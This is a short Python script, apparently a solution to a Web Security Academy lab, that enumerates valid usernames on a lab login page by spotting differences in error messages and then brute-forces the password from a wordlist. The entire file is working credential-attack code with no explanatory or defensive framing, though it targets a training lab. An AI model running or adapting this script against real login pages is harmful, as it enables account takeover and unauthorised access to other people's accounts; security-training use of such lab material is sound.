import requests

login_url = 'https://0aa4001d04c7c523819f8e3f0073003d.web-security-academy.net/login'

def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()
        

usernames = readFile("usernames.txt")
passwords = readFile("passwords.txt")

right_username = ""
print("Finding username - started")
for username in usernames:
    loginData = {"username": username, 
                "password":  "1"}
    response = requests.post(login_url, loginData)
    if "Invalid username" not in response.text:
        print(f"Right Username - Username: {username}")
        right_username = username
        break
print("Finding username - finished")

print("Finding password - started")
for password in passwords:
    loginData = {"username": right_username, 
                "password":  password}
    response = requests.post(login_url, loginData)
    if "Incorrect password" not in response.text:
        print(f"Right combination - Username: {right_username} & password: {password}")
        break
print("Finding password - finished")

print("Finished")

